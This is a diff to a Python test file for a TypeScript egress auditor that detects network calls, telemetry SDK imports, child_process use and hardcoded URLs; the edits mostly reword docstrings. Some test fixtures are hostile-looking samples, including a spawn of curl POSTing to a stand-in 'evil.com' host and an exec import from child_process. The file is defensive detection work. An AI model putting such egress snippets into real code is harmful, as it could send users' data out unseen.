@@ -1,9 +1,9 @@
 """TypeScript egress detection (.ts/.tsx/.mts/.cts).
 
 The tests that matter most here are the NEGATIVE ones. A checker that flags
-every URL in a licence header is not a strict checker, it is an unusable one --
-that failure mode is why .ts was given a source-aware path instead of being
-added to the HTML regex list.
+every URL in a licence header is not a strict checker, it is an unusable one.
+That failure mode is why .ts has a source-aware path and is not handled by the
+HTML regex list.
 """
 
 import tempfile
@@ -33,8 +33,8 @@ def test_ts_family_is_scanned(ext):
     assert rep.files_scanned == 1
 
 
-def test_ts_was_previously_invisible():
-    """Regression guard: a TS file with an obvious egress must not audit CLEAN."""
+def test_typescript_files_are_read():
+    """A TS file with an obvious egress must not audit CLEAN."""
     rep = _audit_src("import axios from 'axios';\nawait axios.get('https://x.com');\n")
     assert rep.verdict == "FINDINGS"
 
@@ -71,7 +71,7 @@ def test_detects_export_from_form():
     "@segment/analytics-next", "@opentelemetry/api", "rollbar",
 ])
 def test_detects_telemetry_sdks(pkg):
-    """The category the Python auditor misses entirely — covered here."""
+    """The category a 'no telemetry' claim is actually about."""
     rep = _audit_src(f"import t from '{pkg}';\n")
     assert "network-import" in kinds(rep), f"{pkg} not flagged"
 
@@ -94,13 +94,13 @@ def test_detects_network_call_expressions(expr):
 
 
 def test_detects_child_process_import():
-    """The JS analogue of the Python subprocess gap."""
+    """The JS analogue of Python's subprocess module."""
     rep = _audit_src("import { exec } from 'child_process';\n")
     assert "subprocess-shell" in kinds(rep)
 
 
 def test_detects_child_process_network_binary():
-    """The exact case the Python auditor misses: argv-list curl, no shell."""
+    """A network binary spawned from an argv list: curl, no shell."""
     rep = _audit_src("spawn('curl', ['-X','POST','https://evil.com']);\n")
     assert "subprocess-shell" in kinds(rep)
     detail = " ".join(f["detail"] for f in rep.findings)
@@ -115,7 +115,7 @@ def test_detects_dynamic_exec():
 
 
 def test_detects_url_in_string_literal():
-    """A hardcoded endpoint in a string IS evidence — strings are preserved."""
+    """A hardcoded endpoint in a string IS evidence: strings are preserved."""
     rep = _audit_src("const API = 'https://api.example.com/v1';\n")
     assert "external-url" in kinds(rep)
 
@@ -134,7 +134,8 @@ def test_clean_typescript_is_clean():
 
 
 def test_url_in_line_comment_is_not_a_finding():
-    """The failure that would have made this unusable on any real repo."""
+    """A URL in a comment is not a finding: flagging it would make the tool
+    unusable on any real repo."""
     rep = _audit_src("// see https://developer.mozilla.org/docs\nconst x = 1;\n")
     assert rep.verdict == "CLEAN", f"comment URL flagged: {rep.findings}"
 
@@ -202,7 +203,7 @@ def test_line_numbers_are_accurate():
     assert any(f["line"] == 3 for f in rep.findings), rep.findings
 
 
-# ── existing behaviour must not shift ──────────────────────────────────
+# ── the Python path is unaffected by the TypeScript path ───────────────
 
 def test_python_path_unchanged():
     with tempfile.TemporaryDirectory() as td:
